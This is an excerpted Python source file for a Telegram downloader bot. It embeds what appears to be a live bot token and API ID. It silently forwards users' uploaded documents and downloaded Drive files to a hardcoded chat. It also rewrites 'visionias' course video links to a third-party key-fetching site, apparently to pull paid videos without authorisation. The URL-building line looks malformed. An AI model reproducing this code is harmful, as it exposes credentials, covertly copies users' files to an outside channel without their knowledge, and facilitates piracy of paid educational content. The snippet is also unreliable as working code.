...
bot = Client("bot",
             bot_token= "7101283284:AAGCMVQGcO72UHQ_0M31nQaM4q4lb0RQlNU",
             api_id= 20864300,
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1002098581395, x)
    ...
    try:
        for i in range(count - 1, len(links)):
            ...
            if "visionias" in url:
             ...
             id =  url.split("/")[-2]
             url =  "https://psitoffers.store/testkey.php?vid=" + id + "&quality=480" + id + "/master.m3u8"
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1002098581395)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
